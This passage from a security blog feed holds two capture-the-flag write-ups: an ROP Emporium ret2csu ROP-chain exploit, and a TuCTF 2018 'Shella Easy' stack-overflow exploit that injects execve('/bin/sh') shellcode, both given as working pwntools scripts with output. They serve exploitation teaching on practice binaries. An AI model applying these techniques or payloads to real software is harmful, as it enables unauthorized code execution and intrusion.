0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
</code></pre><p>Using <code>objdump</code> and <code>grep</code> we can look for the first couple bytes of each function, and see if they show up anywhere in the disassembly.</p>
<p>The address that immediately jumps out to me is <code>0x4003af</code>, which contains the bytes for the <code>_fini</code> function, a suitably inert function.</p>
<pre><code>$ objdump -D ret2csu | grep '06 40' -B 1
  4003ad:       00 0e                   add    %cl,(%rsi)
  4003af:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
--
  40052e:       54                      push   %rsp
  40052f:       49 c7 c0 b0 06 40 00    mov    $0x4006b0,%r8
  400536:       48 c7 c1 40 06 40 00    mov    $0x400640,%rcx
  40053d:       48 c7 c7 07 06 40 00    mov    $0x400607,%rdi
--
  600e45:       00 00                   add    %al,(%rax)
  600e47:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
</code></pre><p>We can look this up in GDB to be sure (adding 1 to align the address correctly).</p>
<pre><code>pwndbg&gt; x/x (0x4003af + 1)
0x4003b0:       0x00000000004006b4
</code></pre><p>Now we can use the <code>ropper</code> tool to find a gadget to set the value of <code>$rdi</code>. Surprise, surprise, we immediately find one.</p>
<pre><code>$ ropper --file ./ret2csu --search '% rdi' 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi

[INFO] File: ./ret2csu
0x00000000004006a3: pop rdi; ret;
</code></pre><h2 id="exploit-development">Exploit Development</h2>
<p>We have all the information we need, so let&rsquo;s start building our exploit. Here&rsquo;s an outline of what we want to achieve:</p>
<ul>
<li>Overwrite the return address in the <code>pwnme</code> function.</li>
<li>Store the values <code>0xcafebabecafebabe</code> and <code>0xd00df00dd00df00d</code> in the <code>$rsi</code> and <code>$rdx</code> registers.</li>
<li>Store the value <code>0xdeadbeefdeadbeef</code> in the <code>$rdi</code> register.</li>
<li>Call the <code>ret2win</code> function with the above values.</li>
</ul>
<p>Note: we have to be pretty careful when using the gadgets we found in the csu function, in order to pass the check after the call, we have to set the values <code>$rbp = 1</code> and <code>$rbx = 0</code>.</p>
<p>We also have to pad out the stack so that the <code>pop</code> instructions after the call don&rsquo;t destroy our rop chain.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>


<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">pop rbx     ; 0
</span><span style="color:#e6db74">pop rbp     ; 1
</span><span style="color:#e6db74">pop r12     ; 0x4003af+1
</span><span style="color:#e6db74">pop r13
</span><span style="color:#e6db74">pop r14     ; 0xcafebabecafebabe
</span><span style="color:#e6db74">pop r15     ; 0xd00df00dd00df00d
</span><span style="color:#e6db74">ret         ; ret2csu_rdx
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
ret2csu_set <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00400680</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">mov rdx, r15
</span><span style="color:#e6db74">mov rsi, r14
</span><span style="color:#e6db74">mov edi, r13d
</span><span style="color:#e6db74">call qword [r12 + rbx*8]
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
ret2csu_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040069a</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">pop rdi     ; 0xdeadbeefdeadbeef
</span><span style="color:#e6db74">ret         ; ret2win
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004006a3</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">jmp qword [reloc.ret2win]
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
ret2win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00400510</span> 


elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2csu&#39;</span>)
rop <span style="color:#f92672">=</span> ROP(elf)

<span style="color:#75715e"># ret2csu_set</span>
rop<span style="color:#f92672">.</span>raw(ret2csu_rdx)
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop rbx</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">1</span>)                  <span style="color:#75715e"># pop rbp</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0x4003af</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)         <span style="color:#75715e"># pop r12</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r13</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0xcafebabecafebabe</span>) <span style="color:#75715e"># pop r14</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0xd00df00dd00df00d</span>) <span style="color:#75715e"># pop r15</span>

<span style="color:#75715e"># ret2csu_rdx</span>
rop<span style="color:#f92672">.</span>raw(ret2csu_set)

<span style="color:#75715e"># pop_rdi</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># stack alignment</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop rbx</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop rbp</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r12</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r13</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r14</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>)                  <span style="color:#75715e"># pop r15</span>
rop<span style="color:#f92672">.</span>raw(pop_rdi)
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>) <span style="color:#75715e"># pop rdi</span>

<span style="color:#75715e"># ret2win</span>
rop<span style="color:#f92672">.</span>raw(ret2win)

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2csu&#39;</span>)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain())

r<span style="color:#f92672">.</span>readline()
log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;Flag: &#39;</span> <span style="color:#f92672">+</span> r<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</code></pre></div><p>And finally, here&rsquo;s our exploit in action.</p>
<pre><code>./exploit.py 
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './ret2csu'
[+] Starting local process './ret2csu': pid 1110
[+] Flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2csu' stopped with exit code 0 (pid 1110)
</code></pre>]]></content></item><item><title>TuCTF 2018 :: Shella Easy</title><link>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</link><pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</guid><description>Reverse Engineering From the file command we can see that it is a dynamically linked linux executable.
$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped Running checksec on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>From the <code>file</code> command we can see that it is a dynamically linked linux executable.</p>
<pre><code>$ file shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
</code></pre><p>Running <code>checksec</code> on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</p>
<pre><code>$ checksec ./shella-easy
[*] './shella-easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre><p>This means a few things for us:</p>
<ul>
<li>We know where everything is stored inside the binary.</li>
<li>We can execute arbitrary shellcode on the stack.</li>
<li>A stack overflow can give us control over program execution.</li>
</ul>
<p>Running <code>shella-easy</code> shows that the binary (at some point) takes user input. We&rsquo;ll need to reverse it in order to understand how it does this, but it is a potential avenue for exploitation.</p>
<pre><code>$ ./shella-easy
I'll have a 0xffc40780 with a side of fries thanks
asdfasdf
</code></pre><p>Reversing the <code>main</code> function of the binary reveals that it uses <code>gets</code> to take user input. As we suspected, this is likely where we can exploit this.</p>
<pre><code>0x08048532      83c408         add esp, 8
0x08048535      8d45b8         lea eax, [s]
0x08048538      50             push eax                    ; char *s
0x08048539      e852feffff     call sym.imp.gets           ; char *gets(char *s)
</code></pre><p>Another important thing to note, is that the binary does have some protections in place against stack overflows; if the variable <code>var_8h</code> is not set to <code>0xdeadbeef</code>, the binary will immediately exit (instead of returning and giving us control).</p>
<pre><code>    0x08048541      817df8efbead.  cmp dword [var_8h], 0xdeadbeef
┌─&lt; 0x08048548      7407           je 0x8048551
│   0x0804854a      6a00           push 0                      ; int status
│   0x0804854c      e84ffeffff     call sym.imp.exit           ; void exit(int status)
└─&gt; 0x08048551      b800000000     mov eax, 0
    0x08048556      8b5dfc         mov ebx, dword [var_4h]
    0x08048559      c9             leave
    0x0804855a      c3             ret
</code></pre><p>We can also see that this variable <code>var_8h</code> is initially set to a value of <code>0xcafebabe</code> higher up in the instruction stream.</p>
<pre><code>0x0804851b      c745f8bebafe.  mov dword [var_8h], 0xcafebabe
</code></pre><p>We&rsquo;ll want to find out where <code>var_8h</code> is stored relative to where our input <code>s</code> is stored, so we can overwrite the value of it in order to bypass this check (when we perform our overflow).</p>
<p>Radare tells us a little about where these variables are supposed to be stored (in the <code>main</code> function header), but we&rsquo;ll want to verify this later.</p>
<pre><code>; var char *s @ ebp-0x48
; var uint32_t var_8h @ ebp-0x8
; var int32_t var_4h @ ebp-0x4
</code></pre><p>We can see that the <code>var_8h</code> is stored below our input buffer <code>s</code> on the stack, this is good for us as we can overwrite its value when we perform our overflow.</p>
<p>A quick calculation <code>0x48 - 0x8 = 0x40 = 64</code> tells us that <code>var_8h</code> is stored 64 bytes after the start of our input buffer.</p>
<h2 id="information-gathering">Information Gathering</h2>
<p>First, let&rsquo;s spin up GDB and verify the location of <code>var_8h</code> relative to our input buffer <code>s</code>.</p>
<p>We&rsquo;ll set a breakpoint just after the <code>gets</code> call so we can see what the stack looks like just after we&rsquo;ve provided the binary with input.</p>
<pre><code>pwndbg&gt; disassemble main
Dump of assembler code for function main:

...

   0x08048539 &lt;+94&gt;:    call   0x8048390 &lt;gets@plt&gt;
   0x0804853e &lt;+99&gt;:    add    esp,0x4
   0x08048541 &lt;+102&gt;:   cmp    DWORD PTR [ebp-0x8],0xdeadbeef
   0x08048548 &lt;+109&gt;:   je     0x8048551 &lt;main+118&gt;
   0x0804854a &lt;+111&gt;:   push   0x0
   0x0804854c &lt;+113&gt;:   call   0x80483a0 &lt;exit@plt&gt;
   0x08048551 &lt;+118&gt;:   mov    eax,0x0
   0x08048556 &lt;+123&gt;:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048559 &lt;+126&gt;:   leave  
   0x0804855a &lt;+127&gt;:   ret    

...

pwndbg&gt; b *0x0804853e
Breakpoint 1 at 0x804853e
</code></pre><p>We can now run the binary inside GDB and we&rsquo;ll give it the value <code>AAAA</code> when it prompts us for input, so we can easily see where our input is stored inside the stack.</p>
<pre><code>pwndbg&gt; r
Starting program: ./shella-easy 
Yeah I'll have a 0xffffcff0 with a side of fries thanks
AAAA

Breakpoint 1, 0x0804853e in main ()

...
</code></pre><p>After dumping the relevant part of the stack, we can verify the location of <code>var_8h</code> relative to <code>s</code> with a simple calculation; <code>0xffffd030 - 0xffffcff0 = 64</code>.</p>
<pre><code>pwndbg&gt; x/20x $ebp-0x48
0xffffcff0:     0x41414141      0xf7fe3200      0x00000000      0xf7e02c1e
0xffffd000:     0xf7fb03fc      0xffffffff      0x00000000      0x080485ab
0xffffd010:     0x00000001      0xffffd0e4      0xffffd0ec      0x08048581
0xffffd020:     0xf7fe3230      0x00000000      0x08048569      0x00000000
0xffffd030:     0xcafebabe      0x00000000      0x00000000      0xf7de9e46
</code></pre><p>While we&rsquo;re at this breakpoint, we can also take a look at what the binary is leaking. Yep, it&rsquo;s definitely the location of our input buffer on the stack, this will make the exploitation process a lot easier.</p>
<pre><code>pwndbg&gt; x/x 0xffffcff0
0xffffcff0:     0x41414141
</code></pre><p>Now let&rsquo;s find the location of the function&rsquo;s return address stored on the stack relative to our input buffer.</p>
<p>We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the <code>var_8h</code> variable overwritten with <code>0xdeadbeef</code>) that we can use to determine the location of the return address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>
var <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./shella-easy&#39;</span>)
gdb<span style="color:#f92672">.</span>debug(r)

r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> var <span style="color:#f92672">+</span> cyclic(<span style="color:#ae81ff">64</span>))
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>We know that the program should crash once we&rsquo;ve overwritten the return address with our bad data. So printing the value of <code>$eip</code> after the crash should give us the bytes that the return address was overwritten with.</p>
<pre><code>pwndbg&gt; p $eip
$1 = (void (*)()) 0x61616163
</code></pre><p>We can use pwntools' <code>cyclic_find</code> function and the bytes contained within <code>eip</code> above, in order to find the offset of the return address from the end of our payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x61616163</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">8</span>
</code></pre></div><h2 id="exploit-development">Exploit Development</h2>
<p>Now that we know the location of <code>var_8h</code> and the return address relative to our input buffer we can begin to craft our exploit.</p>
<p>We know that we can execute arbitrary code within the stack, so let&rsquo;s write up some quick shellcode to give us an interactive shell.</p>
<pre><code>.global _start

_start:
.intel_syntax noprefix
shell:
    push 0x0068732f     # &quot;/sh&quot;
    push 0x6e69622f     # &quot;/bin&quot;
    mov ebx, esp        # &quot;/bin/sh&quot;
    mov ecx, 0
    mov edx, 0
    mov eax, 11
    int 0x80            # execve(&quot;/bin/sh&quot;, 0, 0)
exit:
    mov ebx, 0          # exit code
    mov eax, 0
    int 0x80            # exit(0)
</code></pre><p>Let&rsquo;s compile our shellcode, and get a representation of it that we can use in our exploit code.</p>
<pre><code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">1</span>]: open(<span style="color:#e6db74">&#39;payload&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
Out[<span style="color:#ae81ff">1</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">h/bin</span><span style="color:#ae81ff">\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80</span><span style="color:#e6db74">&#39;</span>
</code></pre></div><p>Now we can build our exploit. Here is an outline of what we want to achieve:</p>
<ul>
<li>Capture the leaked stack address.</li>
<li>Overwrite <code>var_8h</code> with <code>0xdeadbeef</code>.</li>
<li>Overwrite the return address using the leak.</li>
<li>Get code execution.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">h/bin</span><span style="color:#ae81ff">\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80</span><span style="color:#e6db74">&#39;</span>

pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">64</span> <span style="color:#f92672">-</span> len(buf))
var <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)
off <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./shella-easy&#39;</span>)
<span style="color:#75715e">#gdb.attach(r)</span>

<span style="color:#75715e"># capture the leaked stack address</span>
r<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">&#39;Yeah I</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">ll have a &#39;</span>)
leak <span style="color:#f92672">=</span> p32(eval(r<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">10</span>)))
r<span style="color:#f92672">.</span>clean()

<span style="color:#75715e"># send our payload to the binary</span>
r<span style="color:#f92672">.</span>writeline(buf <span style="color:#f92672">+</span> pad <span style="color:#f92672">+</span> var <span style="color:#f92672">+</span> off <span style="color:#f92672">+</span> leak)
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>And finally, here&rsquo;s the exploit in action.</p>
<pre><code>./exploit.py 
[+] Starting local process './shella-easy': pid 3768
[*] Switching to interactive mode
$ cat flag.txt
TuCTF{Shella Easy}
</code></pre>]]></content></item></channel></rss>